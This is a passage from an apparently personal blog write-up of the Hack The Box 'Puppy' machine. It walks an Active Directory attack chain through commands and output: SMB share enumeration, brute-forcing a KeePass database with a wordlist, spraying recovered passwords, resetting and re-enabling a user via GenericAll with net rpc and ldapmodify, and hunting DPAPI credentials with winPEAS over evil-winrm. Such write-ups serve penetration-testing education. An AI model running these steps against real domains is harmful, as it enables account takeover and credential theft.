&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Windows Server &lt;span class="m">2022&lt;/span> Build &lt;span class="m">20348&lt;/span> x64 &lt;span class="o">(&lt;/span>name:DC&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>domain:PUPPY.HTB&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>signing:True&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>SMBv1:False&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> PUPPY.HTB&lt;span class="se">\l&lt;/span>evi.james:KingofAkron2025!
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Enumerated shares
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC Share Permissions Remark
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC ----- ----------- ------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC ADMIN$ Remote Admin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC C$ Default share
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC DEV READ DEV-SHARE &lt;span class="k">for&lt;/span> PUPPY-DEVS
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC IPC$ READ Remote IPC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC NETLOGON READ Logon server share
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC SYSVOL READ Logon server share
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>After accessing the share i can see a &lt;code>.kdbx&lt;/code> database extension file.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl">smbclient //dc.puppy.htb/DEV -U &lt;span class="s1">&amp;#39;PUPPY.HTB\levi.james&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Can&lt;span class="err">&amp;#39;&lt;/span>t load /etc/samba/smb.conf - run testparm to debug it
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password &lt;span class="k">for&lt;/span> &lt;span class="o">[&lt;/span>PUPPY.HTB&lt;span class="se">\l&lt;/span>evi.james&lt;span class="o">]&lt;/span>:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Try &lt;span class="s2">&amp;#34;help&amp;#34;&lt;/span> to get a list of possible commands.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">smb: &lt;span class="se">\&amp;gt;&lt;/span> ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> . DR &lt;span class="m">0&lt;/span> Sun Mar &lt;span class="m">23&lt;/span> 07:07:57 &lt;span class="m">2025&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> .. D &lt;span class="m">0&lt;/span> Sat Mar &lt;span class="m">8&lt;/span> 16:52:57 &lt;span class="m">2025&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> KeePassXC-2.7.9-Win64.msi A &lt;span class="m">34394112&lt;/span> Sun Mar &lt;span class="m">23&lt;/span> 07:09:12 &lt;span class="m">2025&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Projects D &lt;span class="m">0&lt;/span> Sat Mar &lt;span class="m">8&lt;/span> 16:53:36 &lt;span class="m">2025&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> recovery.kdbx A &lt;span class="m">2677&lt;/span> Wed Mar &lt;span class="m">12&lt;/span> 02:25:46 &lt;span class="m">2025&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>While trying to access it, it looks like it require a password.&lt;/p>
&lt;p>&lt;img src="https://r4z1o.github.io/p/puppy-htb-writeup/Puppy3.png"
width="829"
height="642"
srcset="https://r4z1o.github.io/p/puppy-htb-writeup/Puppy3_hu_5a4088d0a4e64e6d.png 480w, https://r4z1o.github.io/p/puppy-htb-writeup/Puppy3_hu_bacd8bfea75bb2bc.png 1024w"
loading="lazy"
alt=" "
class="gallery-image"
data-flex-grow="129"
data-flex-basis="309px"
>&lt;/p>
&lt;p>I cracked the &lt;code>.kdbx&lt;/code> file using the &lt;a class="link" href="https://github.com/r3nt0n/keepass4brute" target="_blank" rel="noopener"
>keepass4brute&lt;/a>, and the password is &lt;code>liverpool&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl"> ./keepass4brute.sh ../recovery.kdbx rockyou.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">keepass4brute 1.3 by r3nt0n
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">https://github.com/r3nt0n/keepass4brute
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Words tested: 36/14344391 - Attempts per minute: &lt;span class="m">86&lt;/span> - Estimated &lt;span class="nb">time&lt;/span> remaining: &lt;span class="m">16&lt;/span> weeks, &lt;span class="m">3&lt;/span> days
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Current attempt: liverpool
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Password found: liverpool
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>As we see i got access to these users passwords.&lt;/p>
&lt;p>&lt;img src="https://r4z1o.github.io/p/puppy-htb-writeup/Puppy4.png"
width="796"
height="528"
srcset="https://r4z1o.github.io/p/puppy-htb-writeup/Puppy4_hu_aafe5e33f933bb6.png 480w, https://r4z1o.github.io/p/puppy-htb-writeup/Puppy4_hu_c50311f3ec8125b2.png 1024w"
loading="lazy"
alt=" "
class="gallery-image"
data-flex-grow="150"
data-flex-basis="361px"
>&lt;/p>
&lt;p>The &lt;code>adam.silver&lt;/code> password is not working as &lt;code>nxc&lt;/code> show below.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl"> nxc smb puppy.htb -u &lt;span class="s1">&amp;#39;adam.silver&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;HJKL2025!&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Windows Server &lt;span class="m">2022&lt;/span> Build &lt;span class="m">20348&lt;/span> x64 &lt;span class="o">(&lt;/span>name:DC&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>domain:PUPPY.HTB&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>signing:True&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>SMBv1:False&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC &lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> PUPPY.HTB&lt;span class="se">\a&lt;/span>dam.silver:HJKL2025! STATUS_LOGON_FAILURE
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>As oppose the &lt;code>Antony C. Edwards&lt;/code> one is working, but with with the SamAccountName &lt;code>ant.edwards&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl">nxc smb puppy.htb -u &lt;span class="s1">&amp;#39;ant.edwards&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;Antman2025!&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Windows Server &lt;span class="m">2022&lt;/span> Build &lt;span class="m">20348&lt;/span> x64 &lt;span class="o">(&lt;/span>name:DC&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>domain:PUPPY.HTB&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>signing:True&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>SMBv1:False&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> PUPPY.HTB&lt;span class="se">\a&lt;/span>nt.edwards:Antman2025!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>After a quick search on this user, i found that we have &lt;code>GenericAll&lt;/code> over the &lt;code>adam.silver&lt;/code> user, who is part of the &lt;code>Remote Management&lt;/code> Group.&lt;/p>
&lt;p>&lt;img src="https://r4z1o.github.io/p/puppy-htb-writeup/Puppy5.png"
width="840"
height="255"
srcset="https://r4z1o.github.io/p/puppy-htb-writeup/Puppy5_hu_98c10a10442492b8.png 480w, https://r4z1o.github.io/p/puppy-htb-writeup/Puppy5_hu_8464616291e7957d.png 1024w"
loading="lazy"
alt=" "
class="gallery-image"
data-flex-grow="329"
data-flex-basis="790px"
>&lt;/p>
&lt;p>We can now change this user&amp;rsquo;s password.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl"> net rpc password &lt;span class="s2">&amp;#34;adam.silver&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;P@ssword2025&amp;#34;&lt;/span> -U &lt;span class="s2">&amp;#34;PUPPY.HTB&amp;#34;&lt;/span>/&lt;span class="s2">&amp;#34;ant.edwards&amp;#34;&lt;/span>%&lt;span class="s2">&amp;#34;Antman2025\!&amp;#34;&lt;/span> -S &lt;span class="s2">&amp;#34;dc.puppy.htb&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Can&lt;span class="err">&amp;#39;&lt;/span>t load /etc/samba/smb.conf - run testparm to debug it
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Even though it still no working, because the account is disabled.
This how to disable the user&amp;rsquo;s account.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl">ldapmodify -x -H ldap://10.10.11.70 &lt;span class="se">\ &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-D &lt;span class="s1">&amp;#39;ant.edwards@puppy.htb&amp;#39;&lt;/span> -w &lt;span class="s1">&amp;#39;Antman2025!&amp;#39;&lt;/span> &lt;span class="s">&amp;lt;&amp;lt;EOF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">changetype: modify
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">replace: userAccountControl
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">userAccountControl: 512
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">modifying entry &lt;span class="s2">&amp;#34;CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And just like that we got the user flag!!&lt;/p>
&lt;p>&lt;img src="https://r4z1o.github.io/p/puppy-htb-writeup/Puppy6.png"
width="963"
height="423"
srcset="https://r4z1o.github.io/p/puppy-htb-writeup/Puppy6_hu_827ea84f3beaa473.png 480w, https://r4z1o.github.io/p/puppy-htb-writeup/Puppy6_hu_1c6e49a2356f2df8.png 1024w"
loading="lazy"
alt=" "
class="gallery-image"
data-flex-grow="227"
data-flex-basis="546px"
>&lt;/p>
&lt;h2 id="root-">Root :
&lt;/h2>&lt;p>Navigating through the File system as &lt;code>adam.silver&lt;/code> i found this &lt;code>C:\Backups&lt;/code> file which unusual, where i found this &lt;code>site-backup-2024-12-30.zip&lt;/code> file.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\B&lt;/span>ackups&amp;gt; ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Directory: C:&lt;span class="se">\B&lt;/span>ackups
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Mode LastWriteTime Length Name
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">---- ------------- ------ ----
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-a---- 3/8/2025 8:22 AM &lt;span class="m">4639546&lt;/span> site-backup-2024-12-30.zip
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>After getting the zip file locally and looking through it i found this config file, that expose the &lt;code>steph.cooper&lt;/code> credentials.&lt;/p>
&lt;p>&lt;img src="https://r4z1o.github.io/p/puppy-htb-writeup/Puppy7.png"
width="548"
height="425"
srcset="https://r4z1o.github.io/p/puppy-htb-writeup/Puppy7_hu_e91705936cbe9c31.png 480w, https://r4z1o.github.io/p/puppy-htb-writeup/Puppy7_hu_6cc09e8da562.png 1024w"
loading="lazy"
alt=" "
class="gallery-image"
data-flex-grow="128"
data-flex-basis="309px"
>&lt;/p>
&lt;p>These are valid as &lt;code>nxc&lt;/code> says.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl">nxc smb puppy.htb -u &lt;span class="s1">&amp;#39;steph.cooper&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;ChefSteph2025!&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Windows Server &lt;span class="m">2022&lt;/span> Build &lt;span class="m">20348&lt;/span> x64 &lt;span class="o">(&lt;/span>name:DC&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>domain:PUPPY.HTB&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>signing:True&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>SMBv1:False&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> PUPPY.HTB&lt;span class="se">\s&lt;/span>teph.cooper:ChefSteph2025!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>``
This user is part of the &lt;code>Remote Management&lt;/code> group as well. So i used &lt;code>evil-winrm&lt;/code> to enumerate further.&lt;/p>
&lt;p>This time i used &lt;code>winPEASx64.exe&lt;/code>. As it shows below it reveals some DPAPI Master keys and Credential file under the &lt;code>steph.cooper&lt;/code> user.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-PowerShell" data-lang="PowerShell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">*&lt;/span>&lt;span class="nb">Evil-WinRM&lt;/span>&lt;span class="p">*&lt;/span> &lt;span class="nb">PS &lt;/span>&lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">steph&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">cooper&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Documents&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">winPEASx64&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">SNIP&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ÉÍÍÍÍÍÍÍÍÍÍ&lt;/span>&lt;span class="err">¹&lt;/span> &lt;span class="n">Checking&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">DPAPI&lt;/span> &lt;span class="n">Master&lt;/span> &lt;span class="n">Keys&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">È&lt;/span> &lt;span class="n">https&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="n">book&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">hacktricks&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">wiki&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">en&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="nb">windows-hardening&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="nb">windows-local&lt;/span>&lt;span class="n">-privilege-escalation&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">html&lt;/span>&lt;span class="c">#dpapi&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">MasterKey&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">steph&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">cooper&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">AppData&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Roaming&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Microsoft&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Protect&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">S&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">1&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">5&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">21&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">1487982659&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">1829050783&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">2281216199&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">1107&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">556a2412&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">1275&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="n">4ccf-b721-e6a0b4f90407&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Accessed&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">3&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">8&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">2025&lt;/span> &lt;span class="mf">7&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">40&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">36&lt;/span> &lt;span class="n">AM&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Modified&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">3&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">8&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">2025&lt;/span> &lt;span class="mf">7&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">40&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">36&lt;/span> &lt;span class="n">AM&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">=================================================================================================&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ÉÍÍÍÍÍÍÍÍÍÍ&lt;/span>&lt;span class="err">¹&lt;/span> &lt;span class="n">Checking&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">DPAPI&lt;/span> &lt;span class="n">Credential&lt;/span> &lt;span class="n">Files&lt;/span>
